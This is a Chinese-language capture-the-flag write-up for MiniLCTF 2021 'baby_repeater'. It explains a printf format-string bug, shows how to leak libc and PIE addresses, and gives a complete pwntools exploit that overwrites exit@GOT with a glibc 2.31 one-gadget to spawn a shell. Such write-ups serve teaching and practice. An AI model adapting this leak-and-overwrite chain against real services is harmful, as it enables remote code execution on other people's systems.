# MiniLCTF 2021 - baby_repeater

## 题目简述

附件为 64 位 PIE，可执行文件开启 Canary 与 NX，但没有 RELRO，GOT 可写。程序把用户输入直接作为 `printf` 格式串反复输出，并允许输入 `exit` 结束。利用目标是先从栈上泄漏 libc 和 PIE 基址，再用格式化字符串把 `exit@GOT` 改为 libc 2.31 的 one-gadget；程序处理 `exit` 时即跳转到 gadget。

## 解题过程

先用一组 `%p` 探测参数位置。比赛部署中：

- `%111$p` 泄漏 `__libc_start_main+243`；
- `%107$p` 泄漏 `main+42`；
- 用户控制的格式串从第 8 个参数位置开始。

所以有：

```python
libc_base = leak111 - libc.sym["__libc_start_main"] - 243
main_addr = leak107 - 42
pie_base = main_addr - 0x14d5
exit_got = pie_base + elf.got["exit"]
```

Dockerfile 指向 Ubuntu 20.04，比赛题解使用匹配的 glibc 2.31，并选择偏移 `0xe6c81` 的 one-gadget。完整利用如下：

```python
from pwn import ELF, context, fmtstr_payload, remote

context.arch = "amd64"
elf = ELF("./baby_repeater", checksec=False)
libc = ELF("./libc-2.31.so", checksec=False)
p = remote("127.0.0.1", 9999)

def leak(slot):
    p.sendlineafter(b"> ", f"%{slot}$p".encode())
    p.recvuntil(b"Your sentence: 0x")
    return int(p.recv(12), 16)

libc_base = leak(111) - libc.sym["__libc_start_main"] - 243
main_addr = leak(107) - 42
pie_base = main_addr - 0x14D5

one_gadget = libc_base + 0xE6C81
exit_got = pie_base + elf.got["exit"]

payload = fmtstr_payload(8, {exit_got: one_gadget}, numbwritten=15)
p.sendlineafter(b"> ", payload)
p.sendlineafter(b"> ", b"exit")
p.interactive()
```

`0xe6c81` 的约束要求相关参数寄存器为空，必须使用与远程完全一致的 libc 并在复现环境中检查约束；若 libc 版本不同，泄漏公式、符号偏移和 gadget 都要重新计算，不能只复制常数。仓库没有保存动态 flag。

## 方法总结

这是一条典型的“格式串泄漏 + 格式串任意写”利用链。PIE 与 ASLR 并没有阻止利用，因为栈上同时残留了模块返回地址和 libc 返回地址；No RELRO 又提供了稳定的 GOT 写目标。最关键的复现边界是 libc 版本：one-gadget 偏移不是跨版本常量，格式串参数位置也应先在目标二进制上重新探测。
